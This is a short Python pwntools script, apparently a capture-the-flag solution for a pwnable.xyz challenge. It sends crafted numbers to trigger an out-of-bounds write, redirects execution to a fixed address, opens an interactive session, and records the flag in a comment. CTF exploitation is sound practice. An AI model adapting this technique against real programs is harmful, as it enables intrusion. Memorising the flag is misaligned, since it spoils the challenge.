from pwn import *

r = remote('svc.pwnable.xyz', 30002)
r.recvuntil("Input: ")
addr = 0x400822
r.sendline(str(addr // 2) + " " + str(addr // 2) + " 13")
r.sendline(str(addr) + " 0 13")
l = r.recvuntil("Input: ")
print(l)
l = r.sendline("A")
r.interactive()





#FLAG{easy_00b_write}
